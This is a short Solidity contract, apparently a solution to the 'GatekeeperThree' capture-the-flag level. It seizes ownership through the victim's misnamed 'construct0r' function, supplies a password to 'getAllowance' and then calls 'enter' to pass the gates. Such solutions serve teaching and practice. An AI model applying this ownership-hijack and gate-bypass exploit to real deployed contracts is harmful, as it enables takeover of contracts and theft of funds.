// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";

contract HackGatekeeper {
    GatekeeperThree public victim;

    constructor(address payable _gatekeeper) {
        victim = GatekeeperThree(_gatekeeper);
        victim.construct0r();
        victim.createTrick();
    }

    function hackIt(bytes32 pass) public {
        uint256 pass1 = uint256(pass);
        
        victim.getAllowance(pass1);
        victim.enter();
    }

    function getAddress() public view returns (SimpleTrick hello) {
        hello = victim.trick();
    }
}
